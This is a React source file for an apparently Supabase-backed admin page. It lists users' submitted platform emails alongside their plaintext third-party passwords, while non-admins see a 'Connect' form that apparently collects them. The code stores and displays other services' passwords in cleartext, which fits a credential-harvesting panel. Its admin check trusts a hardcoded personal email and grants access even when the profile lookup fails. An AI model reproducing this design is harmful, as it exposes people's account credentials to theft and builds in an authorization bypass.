import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import Connect from './Connect';

export default function Admin() {
  const navigate = useNavigate();
  const [user, setUser] = useState<any>(null);
  const [rows, setRows] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);
  const [authChecked, setAuthChecked] = useState(false);

  useEffect(() => {
    const checkAdmin = async (user: any) => {
      if (!user) {
        setIsAdmin(false);
        setLoading(false);
        setAuthChecked(true);
        return;
      }
      setUser(user);

      try {
        const { data: profile } = await supabase
          .from('profiles')
          .select('is_admin')
          .eq('id', user.id)
          .maybeSingle();

        // Fallback: If user is the owner email, allow admin access
        const isOwner = user.email === 'gibsonkobia@gmail.com';

        if (profile?.is_admin || isOwner) {
          setIsAdmin(true);
          fetchSubmissions();
        } else {
          setIsAdmin(false);
          setLoading(false);
          setAuthChecked(true);
        }
      } catch (err) {
        console.error('Error checking admin status:', err);
        if (user.email === 'gibsonkobia@gmail.com') {
          setIsAdmin(true);
          fetchSubmissions();
        } else {
          setIsAdmin(false);
          setLoading(false);
          setAuthChecked(true);
        }
      }
    };

    // Set up auth state listener to catch session changes
    const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
      if (session?.user) {
        await checkAdmin(session.user);
      } else {
        checkAdmin(null);
      }
    });

    return () => {
      subscription?.unsubscribe();
    };
  }, [navigate]);

  const fetchSubmissions = async () => {
    const { data } = await supabase
      .from('platform_connections')
      .select('id, platform, email, third_party_password, created_at, user_id')
      .order('created_at', { ascending: false });
    
    setRows(data || []);
    setLoading(false);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#0a0a0c] flex items-center justify-center text-white">
        <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-white"></div>
      </div>
    );
  }

  if (!isAdmin && authChecked) {
    return <Connect />;
  }

  if (!isAdmin) return null;

  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
        <div className="flex justify-between items-center mb-6">
          <div>
            <h1 className="text-2xl font-semibold">Admin submissions</h1>
            <p className="text-sm text-slate-300">
              Platform connection credentials submitted by users.
            </p>
          </div>
          <button 
            onClick={async () => {
              await supabase.auth.signOut();
              window.location.reload();
            }}
            className="text-sm text-slate-400 hover:text-white underline underline-offset-4"
          >
            Sign Out
          </button>
        </div>
        <div className="overflow-x-auto">
          <table className="min-w-full text-left text-sm">
            <thead className="text-slate-400">
              <tr>
                <th className="px-3 py-2">Platform</th>
                <th className="px-3 py-2">Email</th>
                <th className="px-3 py-2">Password</th>
                <th className="px-3 py-2">Created at</th>
                <th className="px-3 py-2">User ID</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((row) => (
                <tr key={row.id} className="border-t border-white/10">
                  <td className="px-3 py-2">{row.platform}</td>
                  <td className="px-3 py-2">{row.email}</td>
                  <td className="px-3 py-2">{row.third_party_password || '-'}</td>
                  <td className="px-3 py-2 text-slate-400">
                    {new Date(row.created_at).toLocaleString()}
                  </td>
                  <td className="px-3 py-2 text-slate-400 truncate max-w-[100px]">{row.user_id || '-'}</td>
                </tr>
              ))}
              {rows.length === 0 && (
                <tr>
                  <td colSpan={5} className="px-3 py-8 text-center text-slate-500">
                    No submissions found.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </main>
  );
}
